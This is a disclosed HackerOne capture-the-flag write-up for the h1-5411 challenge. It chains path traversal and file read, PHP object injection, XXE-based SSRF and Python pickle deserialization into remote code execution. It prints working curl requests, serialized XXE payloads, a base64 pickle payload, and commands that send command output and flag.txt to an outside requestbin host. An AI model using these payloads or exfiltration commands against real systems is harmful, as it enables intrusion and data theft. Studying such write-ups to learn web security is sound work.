# Flag WriteUp

## Report Details
- **Report ID**: 415202
- **URL**: https://hackerone.com/reports/415202
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-09-27T08:27:35.942Z
- **Disclosed**: 2018-10-22T17:06:23.721Z

## Reporter
- **Username**: caioluders
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-5411-ctf

## Vulnerability Information
Hello everyone , here is my writeup :

## Intro
First I decoded the QR Code of the [tweet](https://twitter.com/Hacker0x01/status/1045075889120268289) , decoding to `Here you go: 68747470733a2f2f68312d353431312e68316374662e636f6d` . Decoding the hex value we get the challenge URL : https://h1-5411.h1ctf.com

## Path traversal + local file read

On the website I found two important endpoints : /generate.php and /memes.php . At the generate.php I started doing some "manual fuzzing" trying some command injection, like `;)'";|id`, and template injections like `{{7*7}}` but nothing seemed to work. 
Analyzing the requests I see that the `template` parameter value is a filename , so I try a path traversal with `../../../../../../../etc/passwd` and I get rick rolled :'( But changing the parameter `type` to `text` works ! And I got the first vulnerability .

Path Traversal in `template` parameter
```
$ curl 'https://h1-5411.h1ctf.com/api/generate.php' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://h1-5411.h1ctf.com/generate.php' -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=xxx' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data 'template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&type=text&top-text=a&bottom-text=b'
{"meme_path":"..\/data\/memes\/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt"}
```
/etc/passwd output
```
$ curl 'https://h1-5411.h1ctf.com/data/memes/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt'
  A

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
u6488:x:6488:6488:,,,:/app:/bin/bash
dyno:x:6488:6488:,,,:/app:/bin/bash

  B
```

First I tried reading some default configurations files like /proc/self/environ and /proc/self/cmdline without any usable information.
Now with file read I can read all the source code of the application. The default /var/www/html/index.php path works fine, that's good news ! Following the path I read generate.php and memes.php, followed by /includes/config.php and /includes/classes.php.
On classes.php we can see that's a class called `ConfigFile` that is not used anywhere and that the code enable external entities on XML with `libxml_disable_entity_loader(false);` showing that the next step is probably a XXE. 
While trying to figure out the next step I remembered that I haven't looked at the /includes/header.php file because I thought that it was useless. Turns out that it has the endpoints import_memes_2.0.php and export_memes_2.0.php on it's comments. 

## Object Injection + XXE + SSRF
Looking at /api/import_memes_2.0.php it's visible that it receives a file that is base64 encoded and unserialize it. After that, it merges with the `$_SESSION['memes']` array. Now I have a clear way to Object Injection into the `ConfigFile` class, but how to exploit it?
Having in mind that we need to get a XXE somewhere, it's clear that we need to call the `parse` function in the class and initialize the class with the `$url` variable being the malicious XXE payload. The `parse` function is only called by `generate` and `__toString` , the latter is a magic function that is called whenever the class is interpreted as a string and that occurs on `memes.php` on the foreach loop.

Now I have a idea how to exploit it.
Create a serialized array, because of the `array_merge()` , with an `ConfigFile` class initialized with a malicious XXE payload.
As it was late of night and I was really tired, I just created all by hand counting the length of the string and all.

The serialized class without the payload looks like this :
```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:2:"ab";}}
```
Now I have to insert the XXE payload, note that it must have `toptext` or a `bottomtext` tag to output the result to the page, at first I tried a RCE payload with `expect://`.
```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:167:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<payload>
    <toptext>&xxe;</toptext>
</payload>";}}
```
But no output was generated, after that I tried to output the stdout to a server with `expect://curl http://requestbin.net/r/w8rpj9w8?a=$(id)` with no success. Turns out that to expect works the module must be loaded on the PHP.
Now the only thing I can think is a SSRF, as I already have local file read. The next payload is a attempt to get the content of http://google.com
```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:174:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://google.com" >]>
<payload>
    <toptext>&xxe;</topttext>
</payload>";}}
```
But it failed again. As I couldn't think of any other way to complete the challenge, I tried another technique to achieve SSRF with `php://filter/read=convert.base64-encode/resource=http://google.com`.
```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:222:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://google.com" >]>
<payload>
    <toptext>&xxe;</toptext>
</payload>";}}
```
And now it worked ! The base64 result was printed on the memes.php page, now I have SSRF.
After that I tried the AWS metadata URL http://169.254.169.254/latest/user-data/ , because the server was on AWS to try to get any credentials, but it didn't work.

So it must be a internal IP. To find the IP:PORT I used the first local file read to read /proc/net/tcp 
```
sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000  6488        0 2574392220 1 0000000000000000 100 0 0 10 0                
   1: 9E3610AC:A862 5579F868:0016 01 00000000:00000000 02:000A25B2 00000000  6488        0 2574386053 2 0000000000000000 20 4 29 10 -1
```
Decoding the hex `0100007F:0539` we get 127.0.0.1:1337, so this must be the next step.

## Pickle injection RCE
Using the SSRF to get the http://127.0.0.1:1337.
```
Meme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: /status - View maintenance status; /update-status Change maintenance status; Debug: The debug parameter allows debugging;
```
http://127.0.0.1:1337/status?debug=1
```
Maintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4
```
Sending the `?debug=1` to /status it shows a Python's Pickle serialized data encoded in base64.
```
(iapp
Status
p1
(dp2
S'message'
p3
S'Maintenance mode: off'
p4
sS'maintenance'
p5
I00
s
```
http://127.0.0.1:1337/update-status?debug=1
```
Missing status parameter
```
So we have to send a status parameter

http://127.0.0.1:1337/update-status?debug=1&status=hacked
```
Invalid status | Debug: Incorrect paddi
```
I tried to send the base64 he outputs on  the /status and it worked ! So I have to send a base64 encoded pickle object on the status parameter. 

Pickle is notorious vulnerable to RCE, so I tried a simple exploit available at https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14.
```
$ python pick.py | base64
Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg==
```
Sending this to `/update-status?debug=1&status=Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg%3D%3D` showed
```
A new status has been loaded. Automatic reloading not implemented yet
```
But no output. Changing the command to `curl http://requestbin.net/r/w8rpj9w8?c=$(id|base64)` sended the output to my server in a get .
```
dWlkPTEwMDAoaGFja2VyKSBnaWQ9MTAwMChoYWNrZXIpIGdyb3Vwcz0xMDAwKGhhY2tlcikK
$ pbpaste | base64 --decode
uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
```
Trying now a `$(ls|base64)`
```
app.py
app.pyc
flag.txt
requirements.txt
static
status.pi
```
And a `$(cat flag.txt|base64)`
```
Yay! Here is your flag:

flag{cha1n1ng_bugs_f0r_fun_4nd_
```
For some reason the base64 is cutted out, but sending a sed command to get the third line `curl -d $(sed -n 3p flag.txt|base64) http://requestbin.net/r/w8rpj9w8` I get all the flag.
```
flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}
```

## Impact

The impact of the challenge is to get me a ticket to h1-5411

## Attachments
No attachments
